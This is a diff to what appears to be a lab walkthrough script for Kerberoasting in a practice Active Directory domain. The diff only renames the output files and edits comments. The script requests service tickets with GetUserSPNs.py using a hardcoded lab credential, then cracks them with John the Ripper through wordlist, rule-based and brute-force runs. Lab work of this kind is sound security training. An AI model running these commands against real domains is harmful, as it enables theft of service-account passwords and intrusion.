@@ -40,24 +40,24 @@ python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.5
 # Now with the -request flag
 python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2 -request
 
-# Step 3: Save the extracted hashes, each in their own txt file. cd to a location where you can create files. We saved them in Documents.
+# Step 3: Save the outputs, each in their own txt file. cd to a location where you can create files. We saved them in Documents.
 
-# extract the easy hash  (corresponding to account with weak password) to a txt file
-echo 'manually copy eash hash value here' > easy_hash.txt
+# extract the easy "ticket" (hash + enc ticket) ; corresponding to account with weak password to a txt file
+echo 'manually copy the output value here' > easy_output.txt
 
-# extract the hard hash  (corresponding to account with strong password) to a txt file
-echo 'manually copy hard hash value here' > hard_hash.txt
+# extract the hard "ticket" (hash + enc ticket); corresponding to account with strong password to a txt file
+echo 'manually copy the output value here' > hard_output.txt
 
 # Step 4: use John the Ripper to crack the passwords. To get the tool: sudo apt install john
 
-# wordlist attack using rockyou.txt on the easy hash
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt easy_hash.txt 
+# wordlist attack using rockyou.txt on the easy output
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt easy_output.txt 
 
-# wordlist attack using rockyou.txt on the hard hash
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hard_hash.txt 
+# wordlist attack using rockyou.txt on the hard output
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hard_output.txt 
 
-# wordlist attack using rockyou.txt on the hard hash using rules now
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_hash.txt
+# wordlist attack using rockyou.txt on the hard output using rules now
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_output.txt
 
 # brute forcing password
-john --format=krb5tgs --incremental hard_hash.txt
+john --format=krb5tgs --incremental hard_output.txt
